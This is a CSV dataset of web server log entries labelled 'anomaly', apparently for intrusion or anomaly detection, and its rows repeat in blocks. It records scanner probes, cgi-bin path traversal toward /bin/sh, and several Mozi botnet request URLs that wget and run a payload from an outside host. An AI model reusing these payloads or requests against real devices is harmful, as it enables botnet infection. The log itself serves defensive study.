ip,date,method,endpoint,status,size,flag
38.109.110.68,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
175.116.56.49,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
10.62.147.87,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
177.134.120.218,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
86.74.25.0,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
243.191.75.250,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
108.192.241.35,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
58.125.123.44,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
134.176.115.193,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
77.131.181.142,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
98.168.170.44,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
73.23.1.51,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
184.96.252.43,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
231.128.183.199,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
213.47.45.163,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
10.228.60.14,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
43.77.194.225,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
168.177.197.14,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
102.80.172.188,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
61.134.149.147,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
102.115.82.40,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
230.18.23.151,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
234.186.97.230,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
21.123.242.102,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
208.33.218.178,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
10.57.70.174,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
79.98.99.0,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
126.145.134.8,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
200.31.16.5,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
67.168.240.90,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
172.211.155.152,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
179.226.232.222,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
253.90.168.209,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
246.211.210.160,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
134.163.218.214,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
176.11.162.156,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
235.166.229.107,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
231.138.105.107,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
136.191.55.75,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
199.28.238.183,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
178.20.136.88,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
4.215.193.210,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
197.17.195.55,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
69.177.43.196,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
115.127.29.10,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
125.182.118.110,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
187.97.70.40,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
20.138.85.153,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
228.78.181.207,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
133.1.56.54,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
67.208.119.133,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
78.54.8.129,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
236.161.184.232,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
200.9.225.106,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
181.66.154.143,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
78.194.110.222,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
106.26.75.163,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
131.142.247.1,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
169.177.86.80,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
63.217.254.202,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
197.75.140.12,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
79.16.254.14,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
49.36.164.73,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
40.253.44.252,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
134.135.91.243,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
231.134.136.29,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
150.68.146.153,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
134.216.57.17,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
171.184.51.15,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
166.39.42.89,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
167.92.167.252,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
197.203.139.193,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
94.224.189.13,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
5.96.160.185,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
120.4.23.217,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
84.2.4.161,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
7.121.235.211,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
121.240.131.56,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
96.47.170.138,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
71.155.43.9,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
33.108.54.79,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
206.188.110.94,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
149.222.110.12,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
29.55.204.190,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
54.173.68.136,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
157.82.183.123,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
126.140.74.227,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
70.161.188.115,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
226.213.221.197,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
163.69.61.171,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
8.59.113.54,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
31.28.3.220,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
165.220.18.72,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
239.123.150.189,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
20.58.239.159,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
193.185.229.154,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
150.205.226.208,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
54.48.115.86,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
214.161.163.55,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
160.114.249.71,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
204.29.82.244,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
86.115.133.106,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
248.143.68.188,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
9.138.240.207,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
206.49.88.205,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
185.173.29.120,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
35.239.145.179,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
79.67.1.27,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
203.47.164.167,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
117.17.8.80,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
114.206.223.168,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
238.4.96.86,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
18.221.245.28,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
62.30.58.151,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
181.10.50.220,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
183.142.166.130,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
60.116.71.224,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
184.213.111.97,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
62.8.239.148,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
204.168.220.132,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
96.18.251.239,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
161.158.31.131,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
112.144.81.11,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
160.250.118.6,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
62.102.39.95,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
135.82.22.59,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
64.85.156.30,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
110.214.121.38,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
106.150.145.182,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
46.115.193.115,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
51.127.93.154,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
137.178.15.48,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
87.190.154.80,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
47.163.81.176,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
161.178.133.209,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
253.170.78.166,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
94.135.217.202,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
215.35.222.184,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
120.164.118.154,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
198.165.175.253,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
30.233.38.127,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
84.247.251.251,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
33.15.28.137,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
250.139.108.225,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
226.117.1.236,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
253.29.172.189,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
189.217.189.108,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
184.117.6.56,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
183.152.104.51,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
34.148.184.248,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
208.189.140.79,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
52.162.71.225,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
78.113.75.190,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
76.155.146.170,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
61.112.243.212,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
6.72.25.98,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
19.11.4.121,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
173.75.172.75,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
95.35.76.9,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
192.58.186.148,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
15.15.81.139,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
249.222.167.37,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
247.35.140.133,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
197.38.62.145,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
105.133.250.142,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
121.117.66.44,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
214.88.109.155,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
153.51.100.179,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
192.147.17.233,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
54.115.186.101,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
23.141.15.76,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
219.104.153.244,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
162.254.156.51,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
82.47.163.2,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
174.143.235.51,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
191.92.242.201,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
45.106.29.134,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
183.23.125.215,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
26.233.232.193,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
53.201.234.67,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
152.153.60.130,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
126.48.133.10,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
253.131.167.254,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
94.140.42.195,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
61.250.45.87,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
138.68.11.57,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
193.200.151.79,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
233.40.229.92,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
79.28.83.1,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
33.120.218.71,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
99.107.21.176,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
198.51.94.235,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
104.238.35.35,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
70.115.21.111,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
66.99.169.106,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
58.246.174.85,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
182.248.40.78,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
135.140.79.133,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
112.15.15.155,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
196.175.118.223,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
108.199.103.66,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
102.126.12.11,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
235.90.243.254,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
181.87.29.236,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
76.121.62.100,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
85.65.113.65,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
40.196.100.75,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
23.97.97.115,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
99.185.94.4,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
40.214.72.132,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
114.116.207.169,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
145.151.121.150,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
166.64.229.56,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
91.229.183.201,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
218.186.207.252,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
127.210.162.22,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
164.228.57.245,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
146.209.101.52,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
244.90.177.98,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
90.91.67.206,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
96.81.21.81,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
204.140.229.62,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
179.167.225.68,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
166.80.151.10,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
115.116.232.235,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
231.227.168.65,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
68.0.185.63,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
173.59.160.167,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
117.197.24.111,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
33.143.13.129,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
186.233.204.197,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
103.42.175.244,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
2.2.42.236,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
114.93.135.8,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
91.227.226.206,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
43.44.159.174,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
124.151.173.138,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
150.225.140.6,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
82.146.1.214,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
156.64.79.203,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
77.6.234.133,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
142.178.43.194,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
149.46.199.34,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
29.56.152.87,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
63.190.42.60,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
81.32.10.71,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
185.32.110.199,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
183.59.225.206,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
156.246.85.164,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
